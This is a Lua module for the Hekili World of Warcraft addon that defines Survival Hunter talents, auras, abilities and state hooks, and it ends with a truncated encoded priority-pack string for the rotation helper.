-- HunterSurvival.lua
-- June 2018

local addon, ns = ...
local Hekili = _G[ addon ]

local class = Hekili.Class
local state = Hekili.State


if UnitClassBase( 'player' ) == 'HUNTER' then
    local spec = Hekili:NewSpecialization( 255 )

    spec:RegisterResource( Enum.PowerType.Focus, {
        terms_of_engagement = {
            aura = "terms_of_engagement",

            last = function ()
                local app = state.buff.terms_of_engagement.applied
                local t = state.query_time

                return app + floor( t - app )
            end,

            interval = 1,
            value = 2,
        }
    } )
    
    -- Talents
    spec:RegisterTalents( {
        vipers_venom = 22275, -- 268501
        terms_of_engagement = 22283, -- 265895
        alpha_predator = 22296, -- 269737

        guerrilla_tactics = 21997, -- 264332
        hydras_bite = 22769, -- 260241
        butchery = 22297, -- 212436

        trailblazer = 19347, -- 199921
        natural_mending = 19348, -- 270581
        camouflage = 23100, -- 199483

        bloodseeker = 22277, -- 260248
        steel_trap = 19361, -- 162488
        a_murder_of_crows = 22299, -- 131894

        born_to_be_wild = 22268, -- 266921
        posthaste = 22276, -- 109215
        binding_shot = 22499, -- 109248

        tip_of_the_spear = 22300, -- 260285
        mongoose_bite = 22278, -- 259387
        flanking_strike = 22271, -- 269751

        birds_of_prey = 22272, -- 260331
        wildfire_infusion = 22301, -- 271014
        chakrams = 23105, -- 259391
    } )

    -- PvP Talents
    spec:RegisterPvpTalents( { 
        gladiators_medallion = 3568, -- 208683
        relentless = 3567, -- 196029
        adaptation = 3566, -- 214027

        trackers_net = 665, -- 212638
        roar_of_sacrifice = 663, -- 53480
        mending_bandage = 662, -- 212640
        hunting_pack = 661, -- 203235
        viper_sting = 3615, -- 202797
        sticky_tar = 664, -- 203264
        dragonscale_armor = 3610, -- 202589
        scorpid_sting = 3609, -- 202900
        spider_sting = 3608, -- 202914
        diamond_ice = 686, -- 203340
        hiexplosive_trap = 3606, -- 236776
        survival_tactics = 3607, -- 202746
    } )

    -- Auras
    spec:RegisterAuras( {
        a_murder_of_crows = {
            id = 131894,
            duration = 15,
            max_stack = 1,
        },
        aspect_of_the_cheetah = {
            id = 186258,
            duration = 9,
            max_stack = 1,
        },
        aspect_of_the_cheetah_sprint = {
            id = 186257, 
            duration = 3,
            max_stack = 1,
        },
        aspect_of_the_eagle = {
            id = 186289,
            duration = 15,
            max_stack = 1,
        },
        aspect_of_the_turtle = {
            id = 186265,
            duration = 8,
            max_stack = 1,
        },
        binding_shot = {
            id = 117405,
            duration = 3600,
            max_stack = 1,
        },
        camouflage = {
            id = 199483,
            duration = 60,
            max_stack = 1,
        },
        coordinated_assault = {
            id = 266779,
            duration = 20,
            max_stack = 1,
        },
        eagle_eye = {
            id = 6197,
        },
        feign_death = {
            id = 5384,
            duration = 360,
            max_stack = 1,
        },
        freezing_trap = {
            id = 3355,
            duration = 60,
            type = "Magic",
            max_stack = 1,
        },
        growl = {
            id = 2649,
            duration = 3,
            max_stack = 1,
        },
        harpoon = {
            id = 190927,
            duration = 3,
            max_stack = 1,
        },
        internal_bleeding = {
            id = 270343,
            duration = 9,
            max_stack = 3
        },
        intimidation = {
            id = 24394,
            duration = 5,
            max_stack = 1,
        },
        kill_command = {
            id = 259277,
            duration = 8,
            max_stack = 1,
            generate = function ()
                local kc = debuff.kill_command
                local name, _, count, _, duration, expires, caster = FindUnitDebuffByID( "target", 259277, "PLAYER" )

                if name then
                    kc.name = name
                    kc.count = 1
                    kc.expires = expires
                    kc.applied = expires - duration
                    kc.caster = caster
                    return
                end

                kc.count = 0
                kc.expires = 0
                kc.applied = 0
                kc.caster = "nobody"
            end,
            copy = "bloodseeker"
        },
        masters_call = {
            id = 54216,
            duration = 4,
            type = "Magic",
            max_stack = 1,
        },
        misdirection = {
            id = 35079,
            duration = 8,
            max_stack = 1,
        },
        mongoose_fury = {
            id = 259388,
            duration = 14,
            max_stack = 5,
        },
        pathfinding = {
            id = 264656,
            duration = 3600,
            max_stack = 1,
        },
        pheromone_bomb = {
            id = 270332,
            duration = 6,
            max_stack = 1,
        },
        posthaste = {
            id = 118922,
            duration = 4,
            max_stack = 1,
        },
        predator = {
            id = 260249,
            duration = 3600,
            max_stack = 2,
        },
        serpent_sting = {
            id = 259491,
            duration = 12,
            type = "Poison",
            max_stack = 1,
        },
        shrapnel_bomb = {
            id = 270339,
            duration = 6,
            max_stack = 1,
        },
        steel_trap = {
            id = 162480,
            duration = 20,
            max_stack = 1,
        },
        tar_trap = {
            id = 135299,
            duration = 3600,
            max_stack = 1,
        },
        terms_of_engagement = {
            id = 265898,
            duration = 10,
            max_stack = 1,
        },
        tip_of_the_spear = {
            id = 260286,
            duration = 10,
            max_stack = 3,
        },
        trailblazer = {
            id = 231390,
            duration = 3600,
            max_stack = 1,
        },
        vipers_venom = {
            id = 268552,
            duration = 8,
            max_stack = 1,
        },
        volatile_bomb = {
            id = 271049,
            duration = 6,
            max_stack = 1,
        },
        wildfire_bomb_dot = {
            id = 269747,
            duration = 6,
            max_stack = 1,
        },
        wildfire_bomb = {
            alias = { "wildfire_bomb_dot", "shrapnel_bomb", "pheromone_bomb", "volatile_bomb" },
            aliasType = "debuff",
            aliasMode = "longest"
        },
        wing_clip = {
            id = 195645,
            duration = 15,
            max_stack = 1,
        },

        -- AZERITE POWERS
        latent_poison = {
            id = 273286,
            duration = 20,
            max_stack = 10
        }
    } )


    spec:RegisterHook( "runHandler", function( action, pool )
        if buff.camouflage.up and action ~= "camouflage" then removeBuff( "camouflage" ) end
        if buff.feign_death.up and action ~= "feign_death" then removeBuff( "feign_death" ) end
    end )


    spec:RegisterStateExpr( "current_wildfire_bomb", function () return "wildfire_bomb" end )
    -- current_wildfire_bomb = "wildfire_bomb"

    local function IsActiveSpell( id )
        local slot = FindSpellBookSlotBySpellID( id )
        if not slot then return false end

        local _, _, spellID = GetSpellBookItemName( slot, "spell" )
        return id == spellID 
    end

    state.IsActiveSpell = IsActiveSpell


    local pheromoneReset = false
    local FindUnitDebuffByID = ns.FindUnitDebuffByID

    spec:RegisterEvent( "COMBAT_LOG_EVENT_UNFILTERED", function ()
        local _, subtype, _, sourceGUID, sourceName, _, _, destGUID, destName, destFlags, _, spellID, spellName = CombatLogGetCurrentEventInfo()

        if sourceGUID == state.GUID and spellID == 259489 and subtype == "SPELL_CAST_SUCCESS" then
            pheromoneReset = FindUnitDebuffByID( "target", 270332 ) and true or false
        end
    end )


    spec:RegisterHook( "reset_precast", function()
        if talent.wildfire_infusion.enabled then
            if IsActiveSpell( 270335 ) then current_wildfire_bomb = "shrapnel_bomb"
            elseif IsActiveSpell( 270323 ) then current_wildfire_bomb = "pheromone_bomb"
            elseif IsActiveSpell( 271045 ) then current_wildfire_bomb = "volatile_bomb"
            else current_wildfire_bomb = "wildfire_bomb" end                
        else
            current_wildfire_bomb = "wildfire_bomb"
        end

        if prev_gcd[1].kill_command and pheromoneReset and cooldown.kill_command.remains > 0 and ( now - action.kill_command.lastCast < 0.25 ) then
            setCooldown( "kill_command", 0 )
        end

        if now - action.harpoon.lastCast < 1.5 then
            setDistance( 5 )
        end
    end )

    spec:RegisterStateTable( "next_wi_bomb", setmetatable( {}, {
        __index = function( t, k )
            if k == "shrapnel" then return current_wildfire_bomb == "shrapnel_bomb"
            elseif k == "pheromone" then return current_wildfire_bomb == "pheromone_bomb"
            elseif k == "volatile" then return current_wildfire_bomb == "volatile_bomb" end
            return false
        end
    } ) )

    spec:RegisterStateTable( "bloodseeker", setmetatable( {}, {
        __index = function( t, k )
            if k == "count" then
                return active_dot.kill_command
            end

            return debuff.kill_command[ k ]
        end,
    } ) )


    spec:RegisterStateExpr( "bloodseeker", function () return debuff.bloodseeker end )


    -- Abilities
    spec:RegisterAbilities( {
        a_murder_of_crows = {
            id = 131894,
            cast = 0,
            cooldown = 60,
            gcd = "spell",
            
            spend = 30,
            spendType = "focus",
            
            toggle = "cooldowns",

            startsCombat = true,
            texture = 645217,

            talent = "a_murder_of_crows",
            
            handler = function ()
                applyDebuff( "target", "a_murder_of_crows" )
            end,
        },
        

        aspect_of_the_cheetah = {
            id = 186257,
            cast = 0,
            cooldown = function () return talent.born_to_be_wild.enabled and 144 or 180 end,
            gcd = "spell",
            
            startsCombat = false,
            texture = 132242,
            
            handler = function ()
                applyBuff( "aspect_of_the_cheetah_sprint" )
                applyBuff( "aspect_of_the_cheetah", 12 )
            end,
        },
        

        aspect_of_the_eagle = {
            id = 186289,
            cast = 0,
            cooldown = function () return talent.born_to_be_wild.enabled and 72 or 90 end,
            gcd = "off",
            
            toggle = "cooldowns",

            startsCombat = false,
            texture = 612363,
            
            handler = function ()
                applyBuff( "aspect_of_the_eagle" )
            end,
        },
        

        aspect_of_the_turtle = {
            id = 186265,
            cast = 0,
            cooldown = function () return talent.born_to_be_wild.enabled and 144 or 180 end,
            gcd = "spell",
            
            toggle = "defensives",

            startsCombat = false,
            texture = 132199,
            
            handler = function ()
                applyBuff( "aspect_of_the_turtle" )
                setCooldown( "global_cooldown", 8 )
            end,
        },
        

        binding_shot = {
            id = 109248,
            cast = 0,
            cooldown = 45,
            gcd = "spell",
            
            startsCombat = false,
            texture = 462650,
            
            handler = function ()
                applyDebuff( "target", "binding_shot" )
            end,
        },
        

        butchery = {
            id = 212436,
            cast = 0,
            charges = 3,
            cooldown = 9,
            recharge = 9,
            hasteCD = true,
            gcd = "spell",
            
            spend = 30,
            spendType = "focus",
            
            startsCombat = true,
            texture = 999948,

            aura = function () return debuff.shrapnel_bomb.up and "internal_bleeding" or nil end,
            cycle = function () return debuff.shrapnel_bomb.up and "internal_bleeding" or nil end,

            talent = "butchery",

            usable = function () return charges > 1 or active_enemies > 1 or target.time_to_die < ( 9 * haste ) end,
            handler = function ()
                removeBuff( "butchers_bone_apron" )

                gainChargeTime( "wildfire_bomb", min( 5, active_enemies ) )
                gainChargeTime( "shrapnel_bomb", min( 5, active_enemies ) )
                gainChargeTime( "volatile_bomb", min( 5, active_enemies ) )
                gainChargeTime( "pheromone_bomb", min( 5, active_enemies ) )

                if level < 116 and equipped.frizzos_fingertrap and active_dot.lacerate > 0 then
                    active_dot.lacerate = active_dot.lacerate + 1
                end

                if talent.birds_of_prey.enabled and buff.coordinated_assault.up and UnitIsUnit( "pettarget", "target" ) then
                    buff.coordinated_assault.expires = buff.coordinated_assault.expires + 1.5
                end

                if debuff.shrapnel_bomb.up then applyDebuff( "target", "internal_bleeding", 9, min( 3, debuff.internal_bleeding.stack + 1 ) ) end
            end,
        },
        

        camouflage = {
            id = 199483,
            cast = 0,
            cooldown = 60,
            gcd = "spell",
            
            toggle = "cooldowns",

            startsCombat = false,
            texture = 461113,

            talent = "camouflage",
            
            usable = function () return time == 0 end,
            handler = function ()
                applyBuff( "camouflage" )
            end,
        },
        

        carve = {
            id = 187708,
            cast = 0,
            cooldown = 6,
            hasteCD = true,
            gcd = "spell",
            
            spend = 35,
            spendType = "focus",
            
            startsCombat = true,
            texture = 1376039,

            -- aura = function () return debuff.shrapnel_bomb.up and "internal_bleeding" or nil end,
            -- cycle = function () return debuff.shrapnel_bomb.up and "internal_bleeding" or nil end,

            notalent = "butchery",
            
            handler = function ()
                removeBuff( "butchers_bone_apron" )

                gainChargeTime( "wildfire_bomb", min( 5, active_enemies ) )
                gainChargeTime( "shrapnel_bomb", min( 5, active_enemies ) )
                gainChargeTime( "volatile_bomb", min( 5, active_enemies ) )
                gainChargeTime( "pheromone_bomb", min( 5, active_enemies ) )

                if level < 116 and equipped.frizzos_fingertrap and active_dot.lacerate > 0 then
                    active_dot.lacerate = active_dot.lacerate + 1
                end

                if debuff.shrapnel_bomb.up then applyDebuff( "target", "internal_bleeding", 9, min( 3, debuff.internal_bleeding.stack + 1 ) ) end

                if talent.birds_of_prey.enabled and buff.coordinated_assault.up and UnitIsUnit( "pettarget", "target" ) then
                    buff.coordinated_assault.expires = buff.coordinated_assault.expires + 1.5
                end
            end,
        },
        

        chakrams = {
            id = 259391,
            cast = 0,
            cooldown = 20,
            gcd = "spell",
            
            spend = 30,
            spendType = "focus",
            
            startsCombat = true,
            texture = 648707,

            talent = "chakrams",
            
            handler = function ()
            end,
        },
        

        coordinated_assault = {
            id = 266779,
            cast = 0,
            cooldown = 120,
            gcd = "spell",
            
            toggle = "cooldowns",

            startsCombat = false,
            texture = 2065565,
            
            usable = function () return pet.alive end,
            handler = function ()
                applyBuff( "coordinated_assault" )
            end,
        },
        

        disengage = {
            id = 781,
            cast = 0,
            charges = 1,
            cooldown = 20,
            recharge = 20,
            gcd = "spell",
            
            startsCombat = false,
            texture = 132294,
            
            handler = function ()
                setDistance( 15 )
                if talent.posthaste.enabled then applyBuff( "posthaste" ) end
            end,
        },
        

        --[[ eagle_eye = {
            id = 6197,
            cast = 0,
            cooldown = 0,
            gcd = "spell",
            
            startsCombat = true,
            texture = 132172,
            
            handler = function ()
            end,
        }, ]]
        

        exhilaration = {
            id = 109304,
            cast = 0,
            cooldown = 120,
            gcd = "spell",
            
            toggle = "defensives",

            startsCombat = false,
            texture = 461117,
            
            handler = function ()
                gain( 0.3 * health.max, "health" )
            end,
        },
        

        feign_death = {
            id = 5384,
            cast = 0,
            cooldown = 30,
            gcd = "off",
            
            startsCombat = false,
            texture = 132293,
            
            handler = function ()
                applyBuff( "feign_death" )
            end,
        },
        

        flanking_strike = {
            id = 269751,
            cast = 0,
            cooldown = 40,
            gcd = "spell",
            
            startsCombat = true,
            texture = 236184,

            talent = "flanking_strike",
            
            usable = function () return pet.alive end,
            handler = function ()
                gain( 30, "focus" )
            end,
        },
        

        --[[ flare = {
            id = 1543,
            cast = 0,
            cooldown = 20,
            gcd = "spell",
            
            startsCombat = true,
            texture = 135815,
            
            handler = function ()
            end,
        }, ]]
        

        freezing_trap = {
            id = 187650,
            cast = 0,
            cooldown = 30,
            gcd = "spell",
            
            startsCombat = false,
            texture = 135834,
            
            handler = function ()
                applyDebuff( "target", "freezing_trap" )
            end,
        },
        

        harpoon = {
            id = 190925,
            cast = 0,
            charges = 1,
            cooldown = 20,
            recharge = 20,
            gcd = "spell",
            
            startsCombat = true,
            texture = 1376040,
            
            usable = function () return target.distance > 8 end,
            handler = function ()
                applyDebuff( "target", "harpoon" )
                if talent.terms_of_engagement.enabled then applyBuff( "terms_of_engagement" ) end
                setDistance( 5 )
            end,
        },
        

        intimidation = {
            id = 19577,
            cast = 0,
            cooldown = 60,
            gcd = "spell",
            
            startsCombat = true,
            texture = 132111,
            
            usable = function () return pet.alive end,
            handler = function ()
                applyDebuff( "target", "intimidation" )
            end,
        },
        

        kill_command = {
            id = 259489,
            cast = 0,
            charges = function () return talent.alpha_predator.enabled and 2 or nil end,
            cooldown = 6,
            recharge = 6,
            hasteCD = true,
            gcd = "spell",

            spend = -15,
            spendType = "focus",
            
            startsCombat = true,
            texture = 132176,

            cycle = function () return talent.bloodseeker.enabled and "kill_command" or nil end,
            
            usable = function () return pet.alive end,
            handler = function ()
                if talent.bloodseeker.enabled then
                    applyBuff( "predator", 8 )
                    applyDebuff( "target", "kill_command", 8 )
                end
                if talent.tip_of_the_spear.enabled then addStack( "tip_of_the_spear", 20, 1 ) end

                if debuff.pheromone_bomb.up then 
                    if talent.alpha_predator.enabled then gainCharges( "kill_command", 1 )
                    else setCooldown( "kill_command", 0 ) end
                end
                
                if debuff.shrapnel_bomb.up then applyDebuff( "internal_bleeding", 9, min( 3, debuff.internal_bleeding.stack + 1 ) ) end
            end,
        },
        

        masters_call = {
            id = 272682,
            cast = 0,
            cooldown = 45,
            gcd = "off",
            
            startsCombat = false,
            texture = 236189,
            
            usable = function () return pet.alive end,
            handler = function ()
                applyBuff( "masters_call" )
            end,
        },
        

        misdirection = {
            id = 34477,
            cast = 0,
            cooldown = 30,
            gcd = "off",
            
            startsCombat = false,
            texture = 132180,
            
            handler = function ()
                applyBuff( "misdirection" )
            end,
        },
        

        mongoose_bite = {
            id = 259387,
            cast = 0,
            cooldown = 0,
            gcd = "spell",
            
            spend = 30,
            spendType = "focus",
            
            startsCombat = true,
            texture = 1376044,

            aura = function () return debuff.shrapnel_bomb.up and "internal_bleeding" or nil end,
            cycle = function () return debuff.shrapnel_bomb.up and "internal_bleeding" or nil end,

            talent = "mongoose_bite",
            
            handler = function ()
                if buff.mongoose_fury.down then applyBuff( "mongoose_fury" )
                else applyBuff( "mongoose_fury", buff.mongoose_fury.remains, min( 5, buff.mongoose_fury.stack + 1 ) ) end
                if debuff.shrapnel_bomb.up then
                    if debuff.internal_bleeding.up then applyDebuff( "target", "internal_bleeding", 9, debuff.internal_bleeding.stack + 1 ) end
                end

                removeDebuff( "target", "latent_poison" )

                if azerite.wilderness_survival.enabled then
                    gainChargeTime( "wildfire_bomb", 1 )
                    if talent.wildfire_infusion.enabled then
                        gainChargeTime( "shrapnel_bomb", 1 )
                        gainChargeTime( "pheromone_bomb", 1 )
                        gainChargeTime( "volatile_bomb", 1 )
                    end
                end
            end,

            copy = { 265888, "mongoose_bite_eagle" }
        },
        

        muzzle = {
            id = 187707,
            cast = 0,
            cooldown = 15,
            gcd = "off",
            
            startsCombat = true,
            texture = 1376045,

            toggle = "interrupts",

            usable = function () return target.casting end,            
            handler = function ()
                interrupt()
            end,
        },
        

        pheromone_bomb = {
            id = 270323,            
            known = 259495,
            cast = 0,
            charges = function () return talent.guerrilla_tactics.enabled and 2 or nil end,
            cooldown = 18,
            recharge = 18,
            gcd = "spell",
            
            startsCombat = true,
            texture = 2065635,

            bind = "wildfire_bomb",
            talent = "wildfire_infusion",

            usable = function () return current_wildfire_bomb == "pheromone_bomb" end,
            handler = function ()
                applyDebuff( "target", "pheromone_bomb" )
                current_wildfire_bomb = "wildfire_bomb"
            end,
        },
        

        raptor_strike = {
            id = 186270,
            cast = 0,
            cooldown = 0,
            gcd = "spell",
            
            spend = 30,
            spendType = "focus",
            
            startsCombat = true,
            texture = 1376046,

            aura = function () return debuff.shrapnel_bomb.up and "internal_bleeding" or nil end,
            cycle = function () return debuff.shrapnel_bomb.up and "internal_bleeding" or nil end,

            notalent = "mongoose_bite",
            
            handler = function ()
                removeBuff( "tip_of_the_spear" )

                if debuff.shrapnel_bomb.up then
                    if debuff.internal_bleeding.up then applyDebuff( "target", "internal_bleeding", 9, debuff.internal_bleeding.stack + 1 ) end
                end

                if talent.birds_of_prey.enabled and buff.coordinated_assault.up and UnitIsUnit( "pettarget", "target" ) then
                    buff.coordinated_assault.expires = buff.coordinated_assault.expires + 1.5
                end

                removeDebuff( "target", "latent_poison" )

                if azerite.wilderness_survival.enabled then
                    gainChargeTime( "wildfire_bomb", 1 )
                    if talent.wildfire_infusion.enabled then
                        gainChargeTime( "shrapnel_bomb", 1 )
                        gainChargeTime( "pheromone_bomb", 1 )
                        gainChargeTime( "volatile_bomb", 1 )
                    end
                end
            end,

            copy = { "raptor_strike_eagle", 265189 },
        },
        

        serpent_sting = {
            id = 259491,
            cast = 0,
            cooldown = 0,
            gcd = "spell",
            
            spend = function () return buff.vipers_venom.up and 0 or 20 end,
            spendType = "focus",
            
            startsCombat = true,
            texture = 1033905,
            
            handler = function ()
                removeBuff( "vipers_venom" )
                applyDebuff( "target", "serpent_sting" )

                if azerite.latent_poison.enabled then
                    applyDebuff( "target", "latent_poison" )
                end
            end,
        },
        

        shrapnel_bomb = {
            id = 270335,
            known = 259495,
            cast = 0,
            charges = function () return talent.guerrilla_tactics.enabled and 2 or nil end,
            cooldown = 18,
            recharge = 18,
            hasteCD = true,
            gcd = "spell",
            
            startsCombat = true,
            texture = 2065637,

            bind = "wildfire_bomb",
            
            usable = function () return current_wildfire_bomb == "shrapnel_bomb" end,
            handler = function ()
                applyDebuff( "target", "shrapnel_bomb" )
                current_wildfire_bomb = "wildfire_bomb"
            end,
        },
        

        steel_trap = {
            id = 162488,
            cast = 0,
            cooldown = 30,
            gcd = "spell",
            
            startsCombat = false,
            texture = 1467588,
            
            handler = function ()
                applyDebuff( "target", "steel_trap" )
            end,
        },

        
        summon_pet = {
            id = 883,
            cast = 0,
            cooldown = 0,
            gcd = "spell",

            spend = 0,
            spendType = "focus",

            startsCombat = false,
            texture = 'Interface\\ICONS\\Ability_Hunter_BeastCall',

            essential = true,

            usable = function () return not pet.exists end,
            handler = function ()
                summonPet( 'made_up_pet', 3600, 'ferocity' )
            end,
        },


        tar_trap = {
            id = 187698,
            cast = 0,
            cooldown = 30,
            gcd = "spell",
            
            startsCombat = false,
            texture = 576309,
            
            handler = function ()
                applyDebuff( "target", "tar_trap" )
            end,
        },
        

        volatile_bomb = {
            id = 271045,
            known = 259495,
            charges = function () return talent.guerrilla_tactics.enabled and 2 or nil end,
            cast = 0,
            charges = 2,
            cooldown = 18,
            recharge = 18,
            hasteCD = true,
            gcd = "spell",
            
            startsCombat = true,
            texture = 2065636,

            bind = "wildfire_bomb",
            
            usable = function () return current_wildfire_bomb == "volatile_bomb" end,
            handler = function ()
                if debuff.serpent_sting.up then applyDebuff( "target", "serpent_sting" ) end
                current_wildfire_bomb = "wildfire_bomb"
            end,
        },
        

        wildfire_bomb = {
            id = 259495,
            cast = 0,
            charges = function () return talent.guerrilla_tactics.enabled and 2 or nil end,
            cooldown = 18,
            recharge = 18,
            hasteCD = true,
            gcd = "spell",
            
            startsCombat = true,
            texture = function ()
                if not current_wildfire_bomb or current_wildfire_bomb == "wildfire_bomb" then return 2065634 end
                return action[ current_wildfire_bomb ].texture
            end,
            
            aura = "wildfire_bomb",
            bind = function () return current_wildfire_bomb end,

            usable = function () return current_wildfire_bomb ~= "pheromone_bomb" or debuff.serpent_sting.up end,
            handler = function ()
                if current_wildfire_bomb ~= "wildfire_bomb" then
                    runHandler( current_wildfire_bomb )
                    current_wildfire_bomb = "wildfire_bomb"
                    return
                end
                applyDebuff( "target", "wildfire_bomb_dot" )
            end,
        },
        

        wing_clip = {
            id = 195645,
            cast = 0,
            cooldown = 0,
            gcd = "spell",
            
            spend = 30,
            spendType = "focus",
            
            startsCombat = true,
            texture = 132309,
            
            handler = function ()
                applyDebuff( "target", "wing_clip" )
            end,
        },
    } )

    
    spec:RegisterOptions( {
        enabled = true,

        aoe = 2,
    
        nameplates = true,
        nameplateRange = 8,
        
        damage = true,
        damageExpiration = 8,
    
        potion = "potion_of_bursting_blood",

        package = "Survival"
    } )


    spec:RegisterPack( "Survival", 20180930.1311, [[duKPibqirqpIiIljss0Mur(KijHrPcYPub1QqbYRaOzru6wIKyxu5xayyOGoMi0Yej1ZiIAAOa11ejABOa(grKACIaDorsQ1PIkAEef3JiTprchufvYcjcpKisCrvuPgjrK0jfjj1kvHUPiG2jk0qvrfwQiapvLMkGAVG(lHbtQdlSyr9yunzL6YqBwjFMQA0evNwXQfjj51aYSj52aTBP(TKHtvwoINRQPt56O02fP(UiA8QaNxfL1RIQMpkA)inmriWW7omeYyQzyIjidt1sMHUeLCIjkzgm8AN5HWRxWbk8r4TdqeEVSK0t6qbVEXzQk2qGH3VyjCeELBM3Fobaa)XKZMD8ceGFazvHnvZjXYa4hqoazvLbiVIuzJPbWJuRrHpaNdcMaIz)aCosacjv22qI4YsspPdL7hqo8MzhLLQUHz4Dhgczm1mmXeKHPAjZqxIsMHjyIma8(EihYyQtzkHx5ZEJnmdVB85WRKq1xws6jDOOAjv22qc9OKq1YnZ7pNaaG)yYzZoEbcWpGSQWMQ5Kyza8dihGSQYaKxrQSX0a4rQ1OWhGZbbtaXSFaohjaHKkBBirCzjPN0HY9diNEusO6l6ziygjuDIjOSuDQzyIjivNkuDINtgYGP6ZrcKEKEusOAjf5r7J)5KEusO6uHQpx7nUP6ei75pVcPARO6nUcwLr1b3MQPA18MJEusO6uHQLuKhTpUPAli(OjMfvJh4rW)NQFQ2kQMFgxHcli(O9o6rjHQtfQobw7zn4MQ5bjnk4BcvBfvNSiar1GfbPAm(rDgvNCm5uTjhP6yVRovXt1dONcbX2cBQMQRfvNoitKvOdE9i1Aui8kju9LLKEshkQwsLTnKqpkjuTCZ8(Zjaa4pMC2SJxGa8diRkSPAojwga)aYbiRQma5vKkBmnaEKAnk8b4CqWeqm7hGZrcqiPY2gsexws6jDOC)aYPhLeQ(IEgcMrcvlzgklvNAgMycs1PcvN45KHmKEKEusOAjf5r7J)5KEusO6uHQpx7nUP6ei75pVcPARO6nUcwLr1b3MQPA18MJEusO6uHQLuKhTpUPAli(OjMfvJh4rW)NQFQ2kQMFgxHcli(O9o6rjHQtfQobw7zn4MQ5bjnk4BcvBfvNSiar1GfbPAm(rDgvNCm5uTjhP6yVRovXt1dONcbX2cBQMQRfvNoitKvOJEKEusO6Z9biN1WnvNXvrqQMxG5WO6m6p97O6ZfNJE2t1D1PI8GaUyvuDWTP6NQRwDMJEm42u978iiVaZHjDPIhi6XGBt1VZJG8cmhgGsbiy9bX2cBQMEm42u978iiVaZHbOuawvTPhdUnv)opcYlWCyakfGNfeSAHhA0JscvF7W7LxgvtIzt1z21c3u9BH9uDgxfbPAEbMdJQZO)0pvh9MQ9iyQ4vMnTpvppvVRgD0Jb3MQFNhb5fyomaLcW3H3lVmXBH90Jb3MQFNhb5fyomaLcGxzt10Jb3MQFNhb5fyomaLcWBiQegj8OhdUnv)opcYlWCyakfa5bXRQMEKEusO6Z9biN1WnvJPrYzuTnGivBYrQo4wrO65P6iDmQiRqh9yWTP6xki75pVcPhdUnv)akfa2hfJHGp9yWTP6hqPaWdLseCBQwOM3KTdqukF)0Jb3MQFaLcaHTfb3MQfQ5nz7aeLcMfHNi5AeVj7SKgCBsJcSrWbFzs9jluyBUKJAVgckMEX(t1oSJSc3NSqHT5cLN8q4rWDyfXHDKv4(KfkSnhy1(v9Oipg6WoYkCtpgCBQ(bukae2weCBQwOM3KTdquAY1iEt2zjn42KgfyJGd(YK6twOW2Cjh1Eneum9I9NQDyhzfUPhdUnv)akfacBlcUnvluZBY2bik9nzNL0GBtAuGnco4ltQPhdUnv)akfacBlcUnvluZBY2bikLRWinspgCBQ(bukabHhnkSIqW2OhPhdUnv)o((LMvvTflwYzYolP8Qu7kz74vr2thgUfX)bRYCeemM(tHKzi9yWTP63X3pGsbiAo(gjucEOuYolP8Qu7kz74vr2thgUfX)bRYCeemM(tHKzi9yWTP63X3pGsbynemRQAl7SKYRsTRKTJxfzpDy4we)hSkZrqWy6pfsMH0Jb3MQFhF)akfa14l3ErQk2Tpi2g9yWTP63X3pGsbiJKhjanTVSZskVk1Us2oEvK90HHBr8FWQmhbbJP)uWamKjtBarHvI9GYKyI0Jb3MQFhF)akfaVYMQLDwsZSRLJxfzpDy4we)hSkZX6D6qz21YLrYJeGM23X6XKzMDTCzvvBXILCMJ1JjZesco6msPuNsij4ORi8dZKPnGOWkXEqzsndqpgCBQ(D89dOuaI3d5MOwctokWWxHYolPwq8rZTN3IMJPqkdqpspgCBQ(DCfgPrPPdYezfkBhGOuEqsJc(MiB5j9rt20HIfLgCBsJcSrWbFzs5PGBtAuGnco4ZKzkPhdUnv)oUcJ0iGsbieGSKnse1sWjvYNEm42u974kmsJakfaEvK90HHBr8FWQm6XGBt1VJRWincOua4bjnk7SKUlZ9YjHxJkrUaZoB4anTp9yWTP63XvyKgbukajh1EneuKlWSSZsAcTqHT58zrczuQqyb3g(7WoYkCZK5IvPeeKlpi(OWgqugF(MEm42u974kmsJakfaWQ9R6rrEmu2zjDJz21YPcdBt4vZxT7TGdK0ezi9yWTP63XvyKgbukaC5bqKa8PhdUnv)oUcJ0iGsbaOrPe8cem6TS8Z4kuybXhTxAIYolPRIZ(aYJ3ee0hBzwfN9DGXb0Jb3MQFhxHrAeqPaKznUCKCMSZs6IvPeeKlpi(OWgqugF(MjZeAHcBZLCu71qqX0l2FQ2HDKv4MjZDzUxoj8AujYfy2zdhOP9pTlZnTHKouIScX90(U3coqYiz6XGBt1VJRWincOua4bjnk7SKAHcBZ5ZIeYOuHWcUn83HDKv4MEm42u974kmsJakfGLkAGM2x8gzacLDwsxfN9bKhVjiOp2YSko77aJdOhdUnv)oUcJ0iGsbi5O2RHGICbMLDws3L5soQ9AiOixGzhbxe8LhzfYKPfkSnxYrTxdbftVy)PAh2rwHB6XGBt1VJRWincOuaEK4HTjEBAFz5NXvOWcIpAV0eLDwsZSRLl94HKxKg7c0X6rpgCBQ(DCfgPraLcapiPrzNLuEvQDLSDjh1EneuKlWSJGGX0FkshKjYk0XdsAuW3KuLPMEm42u974kmsJakfG3qujms4rpgCBQ(DCfgPraLcG8G4vvl7SKAHcBZzib8f1sGTF4JGyBoSJSc30Jb3MQFhxHrAeqPa8iXdBt820(YYpJRqHfeF0EPjk7SKsWfbF5rwHNYSRLZgprTeMCu8EyqCVfCGKrY0JscvdCr1)aYQcdPA2p8rQEveQobwTFvps1smgs1fHQtaHNveQ(AKbiKQ3SKP9P6Z17HCJQRfvBYrQ(Ch(kuwQMxENr1yWLt1fNZsiyZrQUwuTjhP6GBt1uD0BQo88WEt1cm8vivBfvBYrQo42unv3bi6OhdUnv)oUcJ0iGsbaSA)QEuKhdLDws3yMDTCQWW2eE18v7El4arpgCBQ(DCfgPraLcaj8SIiEJmaHYolPBmZUwovyyBcVA(QDVfCGOhPhdUnv)oWSi8ejxJ4nPps8W2eVnTVSZsAc3L5EK4HTjEBAFNnCGM2NEm42u97aZIWtKCnI3aukajh1EneuKlWSSZs6IvPeeKlpi(OWgqugF(MjZdTko7dipEtqqFSLzvC23bghC4thQXdmrYrKlWSlDPcBu4PDzUhjEyBI3M23zdhOP9pTlZ9iXdBt820(ocUi4lpYkKjZgpWejhrUaZop5iPaRgpLWm7A5aR2VQhflwYzowVtRIZ(aYJ3ee0hBzwfN9DGXbPsWTPAhqJsj4fiy0BhpEtqqFSzqs(W0Jb3MQFhyweEIKRr8gGsbGxfzpDy4we)hSkJEm42u97aZIWtKCnI3aukaHaKLSrIOwcoPs(0Jb3MQFhyweEIKRr8gGsb4nevcJeE0Js